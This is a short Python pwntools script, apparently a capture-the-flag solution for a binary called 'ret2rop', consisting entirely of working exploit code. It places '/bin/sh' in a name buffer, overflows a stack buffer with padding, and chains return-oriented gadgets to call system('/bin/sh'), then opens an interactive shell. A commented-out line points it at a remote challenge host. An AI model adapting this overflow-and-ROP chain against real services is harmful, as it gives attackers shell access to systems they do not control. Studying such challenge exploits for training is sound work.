from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./ret2rop') 
#p = remote('challenge.bluesharkinfo.com',26419)
elf = ELF('./ret2rop')
system = elf.symbols['system']
bin_add = elf.symbols['name'] 
prsi = 0x401a1c 
mov_rdi_rsi = elf.symbols['gadget_mov_rdi_rsi_ret']
rop = ROP(elf)
p.sendlineafter(b"if you want to watch demo", b"no")
p.sendlineafter(b"please int your name", b"/bin/sh\x00")
payload = flat([
    b'A' * 32,        
    b'\x00' * 88,          
    prsi,               
    bin_add,
    mov_rdi_rsi,                     
    system            
])
p.sendafter(b"please introduce yourself", payload)
p.interactive()
